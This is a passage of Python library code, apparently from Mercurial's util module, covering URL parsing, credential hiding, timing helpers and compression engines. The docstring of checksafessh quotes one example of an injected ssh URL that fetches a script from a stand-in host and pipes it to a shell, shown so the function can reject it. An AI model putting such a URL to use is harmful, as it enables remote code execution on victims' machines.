    fn is an optional function that will be applied to the replacement text
    just before replacement.

    escape_prefix is an optional flag that allows using doubled prefix for
    its escaping.
    """
    fn = fn or (lambda s: s)
    patterns = '|'.join(mapping.keys())
    if escape_prefix:
        patterns += '|' + prefix
        if len(prefix) > 1:
            prefix_char = prefix[1:]
        else:
            prefix_char = prefix
        mapping[prefix_char] = prefix_char
    r = remod.compile(br'%s(%s)' % (prefix, patterns))
    return r.sub(lambda x: fn(mapping[x.group()[1:]]), s)

def getport(port):
    """Return the port for a given network service.

    If port is an integer, it's returned as is. If it's a string, it's
    looked up using socket.getservbyname(). If there's no matching
    service, error.Abort is raised.
    """
    try:
        return int(port)
    except ValueError:
        pass

    try:
        return socket.getservbyname(pycompat.sysstr(port))
    except socket.error:
        raise error.Abort(_("no port number associated with service '%s'")
                          % port)

class url(object):
    r"""Reliable URL parser.

    This parses URLs and provides attributes for the following
    components:

    <scheme>://<user>:<passwd>@<host>:<port>/<path>?<query>#<fragment>

    Missing components are set to None. The only exception is
    fragment, which is set to '' if present but empty.

    If parsefragment is False, fragment is included in query. If
    parsequery is False, query is included in path. If both are
    False, both fragment and query are included in path.

    See http://www.ietf.org/rfc/rfc2396.txt for more information.

    Note that for backward compatibility reasons, bundle URLs do not
    take host names. That means 'bundle://../' has a path of '../'.

    Examples:

    >>> url(b'http://www.ietf.org/rfc/rfc2396.txt')
    <url scheme: 'http', host: 'www.ietf.org', path: 'rfc/rfc2396.txt'>
    >>> url(b'ssh://[::1]:2200//home/joe/repo')
    <url scheme: 'ssh', host: '[::1]', port: '2200', path: '/home/joe/repo'>
    >>> url(b'file:///home/joe/repo')
    <url scheme: 'file', path: '/home/joe/repo'>
    >>> url(b'file:///c:/temp/foo/')
    <url scheme: 'file', path: 'c:/temp/foo/'>
    >>> url(b'bundle:foo')
    <url scheme: 'bundle', path: 'foo'>
    >>> url(b'bundle://../foo')
    <url scheme: 'bundle', path: '../foo'>
    >>> url(br'c:\foo\bar')
    <url path: 'c:\\foo\\bar'>
    >>> url(br'\\blah\blah\blah')
    <url path: '\\\\blah\\blah\\blah'>
    >>> url(br'\\blah\blah\blah#baz')
    <url path: '\\\\blah\\blah\\blah', fragment: 'baz'>
    >>> url(br'file:///C:\users\me')
    <url scheme: 'file', path: 'C:\\users\\me'>

    Authentication credentials:

    >>> url(b'ssh://joe:xyz@x/repo')
    <url scheme: 'ssh', user: 'joe', passwd: 'xyz', host: 'x', path: 'repo'>
    >>> url(b'ssh://joe@x/repo')
    <url scheme: 'ssh', user: 'joe', host: 'x', path: 'repo'>

    Query strings and fragments:

    >>> url(b'http://host/a?b#c')
    <url scheme: 'http', host: 'host', path: 'a', query: 'b', fragment: 'c'>
    >>> url(b'http://host/a?b#c', parsequery=False, parsefragment=False)
    <url scheme: 'http', host: 'host', path: 'a?b#c'>

    Empty path:

    >>> url(b'')
    <url path: ''>
    >>> url(b'#a')
    <url path: '', fragment: 'a'>
    >>> url(b'http://host/')
    <url scheme: 'http', host: 'host', path: ''>
    >>> url(b'http://host/#a')
    <url scheme: 'http', host: 'host', path: '', fragment: 'a'>

    Only scheme:

    >>> url(b'http:')
    <url scheme: 'http'>
    """

    _safechars = "!~*'()+"
    _safepchars = "/!~*'()+:\\"
    _matchscheme = remod.compile('^[a-zA-Z0-9+.\\-]+:').match

    def __init__(self, path, parsequery=True, parsefragment=True):
        # We slowly chomp away at path until we have only the path left
        self.scheme = self.user = self.passwd = self.host = None
        self.port = self.path = self.query = self.fragment = None
        self._localpath = True
        self._hostport = ''
        self._origpath = path

        if parsefragment and '#' in path:
            path, self.fragment = path.split('#', 1)

        # special case for Windows drive letters and UNC paths
        if hasdriveletter(path) or path.startswith('\\\\'):
            self.path = path
            return

        # For compatibility reasons, we can't handle bundle paths as
        # normal URLS
        if path.startswith('bundle:'):
            self.scheme = 'bundle'
            path = path[7:]
            if path.startswith('//'):
                path = path[2:]
            self.path = path
            return

        if self._matchscheme(path):
            parts = path.split(':', 1)
            if parts[0]:
                self.scheme, path = parts
                self._localpath = False

        if not path:
            path = None
            if self._localpath:
                self.path = ''
                return
        else:
            if self._localpath:
                self.path = path
                return

            if parsequery and '?' in path:
                path, self.query = path.split('?', 1)
                if not path:
                    path = None
                if not self.query:
                    self.query = None

            # // is required to specify a host/authority
            if path and path.startswith('//'):
                parts = path[2:].split('/', 1)
                if len(parts) > 1:
                    self.host, path = parts
                else:
                    self.host = parts[0]
                    path = None
                if not self.host:
                    self.host = None
                    # path of file:///d is /d
                    # path of file:///d:/ is d:/, not /d:/
                    if path and not hasdriveletter(path):
                        path = '/' + path

            if self.host and '@' in self.host:
                self.user, self.host = self.host.rsplit('@', 1)
                if ':' in self.user:
                    self.user, self.passwd = self.user.split(':', 1)
                if not self.host:
                    self.host = None

            # Don't split on colons in IPv6 addresses without ports
            if (self.host and ':' in self.host and
                not (self.host.startswith('[') and self.host.endswith(']'))):
                self._hostport = self.host
                self.host, self.port = self.host.rsplit(':', 1)
                if not self.host:
                    self.host = None

            if (self.host and self.scheme == 'file' and
                self.host not in ('localhost', '127.0.0.1', '[::1]')):
                raise error.Abort(_('file:// URLs can only refer to localhost'))

        self.path = path

        # leave the query string escaped
        for a in ('user', 'passwd', 'host', 'port',
                  'path', 'fragment'):
            v = getattr(self, a)
            if v is not None:
                setattr(self, a, urlreq.unquote(v))

    @encoding.strmethod
    def __repr__(self):
        attrs = []
        for a in ('scheme', 'user', 'passwd', 'host', 'port', 'path',
                  'query', 'fragment'):
            v = getattr(self, a)
            if v is not None:
                attrs.append('%s: %r' % (a, pycompat.bytestr(v)))
        return '<url %s>' % ', '.join(attrs)

    def __bytes__(self):
        r"""Join the URL's components back into a URL string.

        Examples:

        >>> bytes(url(b'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'))
        'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'
        >>> bytes(url(b'http://user:pw@host:80/?foo=bar&baz=42'))
        'http://user:pw@host:80/?foo=bar&baz=42'
        >>> bytes(url(b'http://user:pw@host:80/?foo=bar%3dbaz'))
        'http://user:pw@host:80/?foo=bar%3dbaz'
        >>> bytes(url(b'ssh://user:pw@[::1]:2200//home/joe#'))
        'ssh://user:pw@[::1]:2200//home/joe#'
        >>> bytes(url(b'http://localhost:80//'))
        'http://localhost:80//'
        >>> bytes(url(b'http://localhost:80/'))
        'http://localhost:80/'
        >>> bytes(url(b'http://localhost:80'))
        'http://localhost:80/'
        >>> bytes(url(b'bundle:foo'))
        'bundle:foo'
        >>> bytes(url(b'bundle://../foo'))
        'bundle:../foo'
        >>> bytes(url(b'path'))
        'path'
        >>> bytes(url(b'file:///tmp/foo/bar'))
        'file:///tmp/foo/bar'
        >>> bytes(url(b'file:///c:/tmp/foo/bar'))
        'file:///c:/tmp/foo/bar'
        >>> print(url(br'bundle:foo\bar'))
        bundle:foo\bar
        >>> print(url(br'file:///D:\data\hg'))
        file:///D:\data\hg
        """
        if self._localpath:
            s = self.path
            if self.scheme == 'bundle':
                s = 'bundle:' + s
            if self.fragment:
                s += '#' + self.fragment
            return s

        s = self.scheme + ':'
        if self.user or self.passwd or self.host:
            s += '//'
        elif self.scheme and (not self.path or self.path.startswith('/')
                              or hasdriveletter(self.path)):
            s += '//'
            if hasdriveletter(self.path):
                s += '/'
        if self.user:
            s += urlreq.quote(self.user, safe=self._safechars)
        if self.passwd:
            s += ':' + urlreq.quote(self.passwd, safe=self._safechars)
        if self.user or self.passwd:
            s += '@'
        if self.host:
            if not (self.host.startswith('[') and self.host.endswith(']')):
                s += urlreq.quote(self.host)
            else:
                s += self.host
        if self.port:
            s += ':' + urlreq.quote(self.port)
        if self.host:
            s += '/'
        if self.path:
            # TODO: similar to the query string, we should not unescape the
            # path when we store it, the path might contain '%2f' = '/',
            # which we should *not* escape.
            s += urlreq.quote(self.path, safe=self._safepchars)
        if self.query:
            # we store the query in escaped form.
            s += '?' + self.query
        if self.fragment is not None:
            s += '#' + urlreq.quote(self.fragment, safe=self._safepchars)
        return s

    __str__ = encoding.strmethod(__bytes__)

    def authinfo(self):
        user, passwd = self.user, self.passwd
        try:
            self.user, self.passwd = None, None
            s = bytes(self)
        finally:
            self.user, self.passwd = user, passwd
        if not self.user:
            return (s, None)
        # authinfo[1] is passed to urllib2 password manager, and its
        # URIs must not contain credentials. The host is passed in the
        # URIs list because Python < 2.4.3 uses only that to search for
        # a password.
        return (s, (None, (s, self.host),
                    self.user, self.passwd or ''))

    def isabs(self):
        if self.scheme and self.scheme != 'file':
            return True # remote URL
        if hasdriveletter(self.path):
            return True # absolute for our purposes - can't be joined()
        if self.path.startswith(br'\\'):
            return True # Windows UNC path
        if self.path.startswith('/'):
            return True # POSIX-style
        return False

    def localpath(self):
        if self.scheme == 'file' or self.scheme == 'bundle':
            path = self.path or '/'
            # For Windows, we need to promote hosts containing drive
            # letters to paths with drive letters.
            if hasdriveletter(self._hostport):
                path = self._hostport + '/' + self.path
            elif (self.host is not None and self.path
                  and not hasdriveletter(path)):
                path = '/' + path
            return path
        return self._origpath

    def islocal(self):
        '''whether localpath will return something that posixfile can open'''
        return (not self.scheme or self.scheme == 'file'
                or self.scheme == 'bundle')

def hasscheme(path):
    return bool(url(path).scheme)

def hasdriveletter(path):
    return path and path[1:2] == ':' and path[0:1].isalpha()

def urllocalpath(path):
    return url(path, parsequery=False, parsefragment=False).localpath()

def checksafessh(path):
    """check if a path / url is a potentially unsafe ssh exploit (SEC)

    This is a sanity check for ssh urls. ssh will parse the first item as
    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
    Let's prevent these potentially exploited urls entirely and warn the
    user.

    Raises an error.Abort when the url is unsafe.
    """
    path = urlreq.unquote(path)
    if path.startswith('ssh://-') or path.startswith('svn+ssh://-'):
        raise error.Abort(_('potentially unsafe url: %r') %
                          (pycompat.bytestr(path),))

def hidepassword(u):
    '''hide user credential in a url string'''
    u = url(u)
    if u.passwd:
        u.passwd = '***'
    return bytes(u)

def removeauth(u):
    '''remove all authentication information from a url string'''
    u = url(u)
    u.user = u.passwd = None
    return bytes(u)

timecount = unitcountfn(
    (1, 1e3, _('%.0f s')),
    (100, 1, _('%.1f s')),
    (10, 1, _('%.2f s')),
    (1, 1, _('%.3f s')),
    (100, 0.001, _('%.1f ms')),
    (10, 0.001, _('%.2f ms')),
    (1, 0.001, _('%.3f ms')),
    (100, 0.000001, _('%.1f us')),
    (10, 0.000001, _('%.2f us')),
    (1, 0.000001, _('%.3f us')),
    (100, 0.000000001, _('%.1f ns')),
    (10, 0.000000001, _('%.2f ns')),
    (1, 0.000000001, _('%.3f ns')),
    )

@attr.s
class timedcmstats(object):
    """Stats information produced by the timedcm context manager on entering."""

    # the starting value of the timer as a float (meaning and resulution is
    # platform dependent, see util.timer)
    start = attr.ib(default=attr.Factory(lambda: timer()))
    # the number of seconds as a floating point value; starts at 0, updated when
    # the context is exited.
    elapsed = attr.ib(default=0)
    # the number of nested timedcm context managers.
    level = attr.ib(default=1)

    def __bytes__(self):
        return timecount(self.elapsed) if self.elapsed else '<unknown>'

    __str__ = encoding.strmethod(__bytes__)

@contextlib.contextmanager
def timedcm(whencefmt, *whenceargs):
    """A context manager that produces timing information for a given context.

    On entering a timedcmstats instance is produced.

    This context manager is reentrant.

    """
    # track nested context managers
    timedcm._nested += 1
    timing_stats = timedcmstats(level=timedcm._nested)
    try:
        with tracing.log(whencefmt, *whenceargs):
            yield timing_stats
    finally:
        timing_stats.elapsed = timer() - timing_stats.start
        timedcm._nested -= 1

timedcm._nested = 0

def timed(func):
    '''Report the execution time of a function call to stderr.

    During development, use as a decorator when you need to measure
    the cost of a function, e.g. as follows:

    @util.timed
    def foo(a, b, c):
        pass
    '''

    def wrapper(*args, **kwargs):
        with timedcm(pycompat.bytestr(func.__name__)) as time_stats:
            result = func(*args, **kwargs)
        stderr = procutil.stderr
        stderr.write('%s%s: %s\n' % (
            ' ' * time_stats.level * 2, pycompat.bytestr(func.__name__),
            time_stats))
        return result
    return wrapper

_sizeunits = (('m', 2**20), ('k', 2**10), ('g', 2**30),
              ('kb', 2**10), ('mb', 2**20), ('gb', 2**30), ('b', 1))

def sizetoint(s):
    '''Convert a space specifier to a byte count.

    >>> sizetoint(b'30')
    30
    >>> sizetoint(b'2.2kb')
    2252
    >>> sizetoint(b'6M')
    6291456
    '''
    t = s.strip().lower()
    try:
        for k, u in _sizeunits:
            if t.endswith(k):
                return int(float(t[:-len(k)]) * u)
        return int(t)
    except ValueError:
        raise error.ParseError(_("couldn't parse size: %s") % s)

class hooks(object):
    '''A collection of hook functions that can be used to extend a
    function's behavior. Hooks are called in lexicographic order,
    based on the names of their sources.'''

    def __init__(self):
        self._hooks = []

    def add(self, source, hook):
        self._hooks.append((source, hook))

    def __call__(self, *args):
        self._hooks.sort(key=lambda x: x[0])
        results = []
        for source, hook in self._hooks:
            results.append(hook(*args))
        return results

def getstackframes(skip=0, line=' %-*s in %s\n', fileline='%s:%d', depth=0):
    '''Yields lines for a nicely formatted stacktrace.
    Skips the 'skip' last entries, then return the last 'depth' entries.
    Each file+linenumber is formatted according to fileline.
    Each line is formatted according to line.
    If line is None, it yields:
      length of longest filepath+line number,
      filepath+linenumber,
      function

    Not be used in production code but very convenient while developing.
    '''
    entries = [(fileline % (pycompat.sysbytes(fn), ln), pycompat.sysbytes(func))
        for fn, ln, func, _text in traceback.extract_stack()[:-skip - 1]
        ][-depth:]
    if entries:
        fnmax = max(len(entry[0]) for entry in entries)
        for fnln, func in entries:
            if line is None:
                yield (fnmax, fnln, func)
            else:
                yield line % (fnmax, fnln, func)

def debugstacktrace(msg='stacktrace', skip=0,
                    f=procutil.stderr, otherf=procutil.stdout, depth=0):
    '''Writes a message to f (stderr) with a nicely formatted stacktrace.
    Skips the 'skip' entries closest to the call, then show 'depth' entries.
    By default it will flush stdout first.
    It can be used everywhere and intentionally does not require an ui object.
    Not be used in production code but very convenient while developing.
    '''
    if otherf:
        otherf.flush()
    f.write('%s at:\n' % msg.rstrip())
    for line in getstackframes(skip + 1, depth=depth):
        f.write(line)
    f.flush()

class dirs(object):
    '''a multiset of directory names from a dirstate or manifest'''

    def __init__(self, map, skip=None):
        self._dirs = {}
        addpath = self.addpath
        if safehasattr(map, 'iteritems') and skip is not None:
            for f, s in map.iteritems():
                if s[0] != skip:
                    addpath(f)
        else:
            for f in map:
                addpath(f)

    def addpath(self, path):
        dirs = self._dirs
        for base in finddirs(path):
            if base in dirs:
                dirs[base] += 1
                return
            dirs[base] = 1

    def delpath(self, path):
        dirs = self._dirs
        for base in finddirs(path):
            if dirs[base] > 1:
                dirs[base] -= 1
                return
            del dirs[base]

    def __iter__(self):
        return iter(self._dirs)

    def __contains__(self, d):
        return d in self._dirs

if safehasattr(parsers, 'dirs'):
    dirs = parsers.dirs

def finddirs(path):
    pos = path.rfind('/')
    while pos != -1:
        yield path[:pos]
        pos = path.rfind('/', 0, pos)

# compression code

SERVERROLE = 'server'
CLIENTROLE = 'client'

compewireprotosupport = collections.namedtuple(u'compenginewireprotosupport',
                                               (u'name', u'serverpriority',
                                                u'clientpriority'))

class compressormanager(object):
    """Holds registrations of various compression engines.

    This class essentially abstracts the differences between compression
    engines to allow new compression formats to be added easily, possibly from
    extensions.

    Compressors are registered against the global instance by calling its
    ``register()`` method.
    """
    def __init__(self):
        self._engines = {}
        # Bundle spec human name to engine name.
        self._bundlenames = {}
        # Internal bundle identifier to engine name.
        self._bundletypes = {}
        # Revlog header to engine name.
        self._revlogheaders = {}
        # Wire proto identifier to engine name.
        self._wiretypes = {}

    def __getitem__(self, key):
        return self._engines[key]

    def __contains__(self, key):
        return key in self._engines

    def __iter__(self):
        return iter(self._engines.keys())

    def register(self, engine):
        """Register a compression engine with the manager.

        The argument must be a ``compressionengine`` instance.
        """
        if not isinstance(engine, compressionengine):
            raise ValueError(_('argument must be a compressionengine'))

        name = engine.name()

        if name in self._engines:
            raise error.Abort(_('compression engine %s already registered') %
                              name)

        bundleinfo = engine.bundletype()
        if bundleinfo:
            bundlename, bundletype = bundleinfo

            if bundlename in self._bundlenames:
                raise error.Abort(_('bundle name %s already registered') %
                                  bundlename)
            if bundletype in self._bundletypes:
                raise error.Abort(_('bundle type %s already registered by %s') %
                                  (bundletype, self._bundletypes[bundletype]))

            # No external facing name declared.
            if bundlename:
                self._bundlenames[bundlename] = name

            self._bundletypes[bundletype] = name

        wiresupport = engine.wireprotosupport()
        if wiresupport:
            wiretype = wiresupport.name
            if wiretype in self._wiretypes:
                raise error.Abort(_('wire protocol compression %s already '
                                    'registered by %s') %
                                  (wiretype, self._wiretypes[wiretype]))

            self._wiretypes[wiretype] = name

        revlogheader = engine.revlogheader()
        if revlogheader and revlogheader in self._revlogheaders:
            raise error.Abort(_('revlog header %s already registered by %s') %
                              (revlogheader, self._revlogheaders[revlogheader]))

        if revlogheader:
            self._revlogheaders[revlogheader] = name

        self._engines[name] = engine

    @property
    def supportedbundlenames(self):
        return set(self._bundlenames.keys())

    @property
    def supportedbundletypes(self):
        return set(self._bundletypes.keys())

    def forbundlename(self, bundlename):
        """Obtain a compression engine registered to a bundle name.

        Will raise KeyError if the bundle type isn't registered.

        Will abort if the engine is known but not available.
        """
        engine = self._engines[self._bundlenames[bundlename]]
        if not engine.available():
            raise error.Abort(_('compression engine %s could not be loaded') %
                              engine.name())
        return engine

    def forbundletype(self, bundletype):
        """Obtain a compression engine registered to a bundle type.

        Will raise KeyError if the bundle type isn't registered.

        Will abort if the engine is known but not available.
        """
        engine = self._engines[self._bundletypes[bundletype]]
        if not engine.available():
            raise error.Abort(_('compression engine %s could not be loaded') %
                              engine.name())
        return engine

    def supportedwireengines(self, role, onlyavailable=True):
        """Obtain compression engines that support the wire protocol.

        Returns a list of engines in prioritized order, most desired first.

        If ``onlyavailable`` is set, filter out engines that can't be
        loaded.
        """
        assert role in (SERVERROLE, CLIENTROLE)

        attr = 'serverpriority' if role == SERVERROLE else 'clientpriority'

        engines = [self._engines[e] for e in self._wiretypes.values()]
        if onlyavailable:
            engines = [e for e in engines if e.available()]

        def getkey(e):
            # Sort first by priority, highest first. In case of tie, sort
            # alphabetically. This is arbitrary, but ensures output is
            # stable.
            w = e.wireprotosupport()
            return -1 * getattr(w, attr), w.name

        return list(sorted(engines, key=getkey))

    def forwiretype(self, wiretype):
        engine = self._engines[self._wiretypes[wiretype]]
        if not engine.available():
            raise error.Abort(_('compression engine %s could not be loaded') %
                              engine.name())
        return engine

    def forrevlogheader(self, header):
        """Obtain a compression engine registered to a revlog header.

        Will raise KeyError if the revlog header value isn't registered.
        """
        return self._engines[self._revlogheaders[header]]

compengines = compressormanager()

class compressionengine(object):
    """Base class for compression engines.

    Compression engines must implement the interface defined by this class.
    """
    def name(self):
        """Returns the name of the compression engine.

        This is the key the engine is registered under.

        This method must be implemented.
        """
        raise NotImplementedError()

    def available(self):
        """Whether the compression engine is available.

        The intent of this method is to allow optional compression engines
        that may not be available in all installations (such as engines relying
        on C extensions that may not be present).
        """
        return True

    def bundletype(self):
        """Describes bundle identifiers for this engine.

        If this compression engine isn't supported for bundles, returns None.

        If this engine can be used for bundles, returns a 2-tuple of strings of
        the user-facing "bundle spec" compression name and an internal
        identifier used to denote the compression format within bundles. To
        exclude the name from external usage, set the first element to ``None``.

        If bundle compression is supported, the class must also implement
        ``compressstream`` and `decompressorreader``.

        The docstring of this method is used in the help system to tell users
        about this engine.
        """
        return None

    def wireprotosupport(self):
        """Declare support for this compression format on the wire protocol.

        If this compression engine isn't supported for compressing wire
        protocol payloads, returns None.

        Otherwise, returns ``compenginewireprotosupport`` with the following
        fields:

        * String format identifier
        * Integer priority for the server
        * Integer priority for the client

        The integer priorities are used to order the advertisement of format
        support by server and client. The highest integer is advertised
        first. Integers with non-positive values aren't advertised.

        The priority values are somewhat arbitrary and only used for default
        ordering. The relative order can be changed via config options.

        If wire protocol compression is supported, the class must also implement
        ``compressstream`` and ``decompressorreader``.
        """
        return None

    def revlogheader(self):
        """Header added to revlog chunks that identifies this engine.

        If this engine can be used to compress revlogs, this method should
        return the bytes used to identify chunks compressed with this engine.
        Else, the method should return ``None`` to indicate it does not
        participate in revlog compression.
        """
        return None

    def compressstream(self, it, opts=None):
        """Compress an iterator of chunks.

        The method receives an iterator (ideally a generator) of chunks of
        bytes to be compressed. It returns an iterator (ideally a generator)
        of bytes of chunks representing the compressed output.

        Optionally accepts an argument defining how to perform compression.
        Each engine treats this argument differently.
        """
        raise NotImplementedError()

    def decompressorreader(self, fh):
        """Perform decompression on a file object.

        Argument is an object with a ``read(size)`` method that returns
        compressed data. Return value is an object with a ``read(size)`` that
        returns uncompressed data.
        """
        raise NotImplementedError()

    def revlogcompressor(self, opts=None):
        """Obtain an object that can be used to compress revlog entries.

        The object has a ``compress(data)`` method that compresses binary
        data. This method returns compressed binary data or ``None`` if
        the data could not be compressed (too small, not compressible, etc).
        The returned data should have a header uniquely identifying this
        compression format so decompression can be routed to this engine.
        This header should be identified by the ``revlogheader()`` return
        value.

        The object has a ``decompress(data)`` method that decompresses
        data. The method will only be called if ``data`` begins with
        ``revlogheader()``. The method should return the raw, uncompressed
        data or raise a ``StorageError``.

        The object is reusable but is not thread safe.
        """
        raise NotImplementedError()

class _CompressedStreamReader(object):
    def __init__(self, fh):
        if safehasattr(fh, 'unbufferedread'):
            self._reader = fh.unbufferedread
        else:
            self._reader = fh.read
        self._pending = []
        self._pos = 0
        self._eof = False

    def _decompress(self, chunk):
        raise NotImplementedError()

    def read(self, l):
        buf = []
        while True:
            while self._pending:
                if len(self._pending[0]) > l + self._pos:
                    newbuf = self._pending[0]
                    buf.append(newbuf[self._pos:self._pos + l])
                    self._pos += l
                    return ''.join(buf)

                newbuf = self._pending.pop(0)
                if self._pos:
                    buf.append(newbuf[self._pos:])
                    l -= len(newbuf) - self._pos
                else:
                    buf.append(newbuf)
                    l -= len(newbuf)
                self._pos = 0

            if self._eof:
                return ''.join(buf)
            chunk = self._reader(65536)
            self._decompress(chunk)
            if not chunk and not self._pending and not self._eof:
                # No progress and no new data, bail out
                return ''.join(buf)

class _GzipCompressedStreamReader(_CompressedStreamReader):
    def __init__(self, fh):
        super(_GzipCompressedStreamReader, self).__init__(fh)
        self._decompobj = zlib.decompressobj()
    def _decompress(self, chunk):
        newbuf = self._decompobj.decompress(chunk)
        if newbuf:
            self._pending.append(newbuf)
        d = self._decompobj.copy()
        try:
            d.decompress('x')
            d.flush()
            if d.unused_data == 'x':
                self._eof = True
        except zlib.error:
            pass

class _BZ2CompressedStreamReader(_CompressedStreamReader):
    def __init__(self, fh):
        super(_BZ2CompressedStreamReader, self).__init__(fh)
        self._decompobj = bz2.BZ2Decompressor()
    def _decompress(self, chunk):
        newbuf = self._decompobj.decompress(chunk)
        if newbuf:
            self._pending.append(newbuf)
        try:
            while True:
                newbuf = self._decompobj.decompress('')
                if newbuf:
                    self._pending.append(newbuf)
                else:
                    break
        except EOFError:
            self._eof = True

class _TruncatedBZ2CompressedStreamReader(_BZ2CompressedStreamReader):
    def __init__(self, fh):
        super(_TruncatedBZ2CompressedStreamReader, self).__init__(fh)
        newbuf = self._decompobj.decompress('BZ')
        if newbuf:
            self._pending.append(newbuf)

class _ZstdCompressedStreamReader(_CompressedStreamReader):
    def __init__(self, fh, zstd):
        super(_ZstdCompressedStreamReader, self).__init__(fh)
        self._zstd = zstd
        self._decompobj = zstd.ZstdDecompressor().decompressobj()
    def _decompress(self, chunk):
        newbuf = self._decompobj.decompress(chunk)
        if newbuf:
            self._pending.append(newbuf)
        try:
            while True:
                newbuf = self._decompobj.decompress('')
                if newbuf:
                    self._pending.append(newbuf)
                else:
                    break
        except self._zstd.ZstdError:
            self._eof = True

class _zlibengine(compressionengine):
    def name(self):
        return 'zlib'

    def bundletype(self):
        """zlib compression using the DEFLATE algorithm.

        All Mercurial clients should support this format. The compression
        algorithm strikes a reasonable balance between compression ratio
        and size.
        """
        return 'gzip', 'GZ'

    def wireprotosupport(self):
        return compewireprotosupport('zlib', 20, 20)

    def revlogheader(self):
        return 'x'

    def compressstream(self, it, opts=None):
        opts = opts or {}

        z = zlib.compressobj(opts.get('level', -1))
        for chunk in it:
            data = z.compress(chunk)
            # Not all calls to compress emit data. It is cheaper to inspect
            # here than to feed empty chunks through generator.
            if data:
                yield data

        yield z.flush()

    def decompressorreader(self, fh):
        return _GzipCompressedStreamReader(fh)

    class zlibrevlogcompressor(object):
        def compress(self, data):
            insize = len(data)
            # Caller handles empty input case.
            assert insize > 0

            if insize < 44:
                return None

            elif insize <= 1000000:
                compressed = zlib.compress(data)
                if len(compressed) < insize:
                    return compressed
                return None

            # zlib makes an internal copy of the input buffer, doubling
            # memory usage for large inputs. So do streaming compression
            # on large inputs.
            else:
                z = zlib.compressobj()
                parts = []
                pos = 0
                while pos < insize:
                    pos2 = pos + 2**20
                    parts.append(z.compress(data[pos:pos2]))
                    pos = pos2
                parts.append(z.flush())

                if sum(map(len, parts)) < insize:
                    return ''.join(parts)
                return None

        def decompress(self, data):
            try:
                return zlib.decompress(data)
            except zlib.error as e:
                raise error.StorageError(_('revlog decompress error: %s') %
                                         stringutil.forcebytestr(e))

    def revlogcompressor(self, opts=None):
        return self.zlibrevlogcompressor()

compengines.register(_zlibengine())

class _bz2engine(compressionengine):
    def name(self):
        return 'bz2'

    def bundletype(self):
        """An algorithm that produces smaller bundles than ``gzip``.

        All Mercurial clients should support this format.

        This engine will likely produce smaller bundles than ``gzip`` but
        will be significantly slower, both during compression and
        decompression.

        If available, the ``zstd`` engine can yield similar or better
        compression at much higher speeds.
        """
        return 'bzip2', 'BZ'

    # We declare a protocol name but don't advertise by default because
    # it is slow.
    def wireprotosupport(self):
        return compewireprotosupport('bzip2', 0, 0)

    def compressstream(self, it, opts=None):
        opts = opts or {}
        z = bz2.BZ2Compressor(opts.get('level', 9))
        for chunk in it:
            data = z.compress(chunk)
            if data:
                yield data

        yield z.flush()

    def decompressorreader(self, fh):
        return _BZ2CompressedStreamReader(fh)

compengines.register(_bz2engine())

class _truncatedbz2engine(compressionengine):
    def name(self):
        return 'bz2truncated'

    def bundletype(self):
        return None, '_truncatedBZ'

    # We don't implement compressstream because it is hackily handled elsewhere.

    def decompressorreader(self, fh):
        return _TruncatedBZ2CompressedStreamReader(fh)

compengines.register(_truncatedbz2engine())

class _noopengine(compressionengine):
    def name(self):
        return 'none'

    def bundletype(self):
        """No compression is performed.

        Use this compression engine to explicitly disable compression.
        """
        return 'none', 'UN'

    # Clients always support uncompressed payloads. Servers don't because
    # unless you are on a fast network, uncompressed payloads can easily
    # saturate your network pipe.
    def wireprotosupport(self):
        return compewireprotosupport('none', 0, 10)

    # We don't implement revlogheader because it is handled specially
    # in the revlog class.

    def compressstream(self, it, opts=None):
        return it

    def decompressorreader(self, fh):
        return fh

    class nooprevlogcompressor(object):
        def compress(self, data):
            return None

    def revlogcompressor(self, opts=None):
        return self.nooprevlogcompressor()

compengines.register(_noopengine())

class _zstdengine(compressionengine):
    def name(self):
        return 'zstd'

    @propertycache
    def _module(self):
        # Not all installs have the zstd module available. So defer importing
        # until first access.
        try:
            from . import zstd
            # Force delayed import.
            zstd.__version__
            return zstd
        except ImportError:
            return None

    def available(self):
        return bool(self._module)

    def bundletype(self):
        """A modern compression algorithm that is fast and highly flexible.

        Only supported by Mercurial 4.1 and newer clients.

        With the default settings, zstd compression is both faster and yields
        better compression than ``gzip``. It also frequently yields better
        compression than ``bzip2`` while operating at much higher speeds.

        If this engine is available and backwards compatibility is not a
        concern, it is likely the best available engine.
        """
        return 'zstd', 'ZS'

    def wireprotosupport(self):
        return compewireprotosupport('zstd', 50, 50)

    def revlogheader(self):
        return '\x28'

    def compressstream(self, it, opts=None):
        opts = opts or {}
        # zstd level 3 is almost always significantly faster than zlib
        # while providing no worse compression. It strikes a good balance
        # between speed and compression.
        level = opts.get('level', 3)

        zstd = self._module
        z = zstd.ZstdCompressor(level=level).compressobj()
        for chunk in it:
            data = z.compress(chunk)
            if data:
                yield data

        yield z.flush()

    def decompressorreader(self, fh):
        return _ZstdCompressedStreamReader(fh, self._module)

    class zstdrevlogcompressor(object):
        def __init__(self, zstd, level=3):
            # TODO consider omitting frame magic to save 4 bytes.
            # This writes content sizes into the frame header. That is
            # extra storage. But it allows a correct size memory allocation
            # to hold the result.
            self._cctx = zstd.ZstdCompressor(level=level)
            self._dctx = zstd.ZstdDecompressor()
            self._compinsize = zstd.COMPRESSION_RECOMMENDED_INPUT_SIZE
            self._decompinsize = zstd.DECOMPRESSION_RECOMMENDED_INPUT_SIZE

        def compress(self, data):
            insize = len(data)
            # Caller handles empty input case.
            assert insize > 0

            if insize < 50:
                return None

            elif insize <= 1000000:
                compressed = self._cctx.compress(data)
                if len(compressed) < insize:
                    return compressed
                return None
            else:
                z = self._cctx.compressobj()
                chunks = []
                pos = 0
                while pos < insize:
                    pos2 = pos + self._compinsize
                    chunk = z.compress(data[pos:pos2])
                    if chunk:
                        chunks.append(chunk)
                    pos = pos2
                chunks.append(z.flush())

                if sum(map(len, chunks)) < insize:
                    return ''.join(chunks)
                return None

        def decompress(self, data):
            insize = len(data)

            try:
                # This was measured to be faster than other streaming
                # decompressors.
                dobj = self._dctx.decompressobj()
                chunks = []
                pos = 0
                while pos < insize:
                    pos2 = pos + self._decompinsize
                    chunk = dobj.decompress(data[pos:pos2])
                    if chunk:
                        chunks.append(chunk)
                    pos = pos2
                # Frame should be exhausted, so no finish() API.

                return ''.join(chunks)
            except Exception as e:
                raise error.StorageError(_('revlog decompress error: %s') %
                                         stringutil.forcebytestr(e))

    def revlogcompressor(self, opts=None):
        opts = opts or {}
        return self.zstdrevlogcompressor(self._module,
                                         level=opts.get('level', 3))

